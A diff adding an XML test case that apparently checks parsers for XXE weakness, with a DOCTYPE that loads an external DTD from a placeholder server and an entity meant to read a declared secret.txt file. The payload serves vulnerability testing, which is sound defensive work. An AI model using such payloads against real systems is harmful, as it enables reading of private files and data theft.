@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--;testcase
+[General]
+name: Doctype Parameter Entity FSA Attack
+description: File System Access via Doctype Parameter Entity
+
+[File secret_txt]
+path: secret.txt
+
+[ServerResponse /doctype-pe.dtd]
+content: doctype-pe.dtd
+access_allowed: True
+-->
+<!DOCTYPE data SYSTEM "http://{server_address}/doctype-pe.dtd">
+<data>&all;</data>
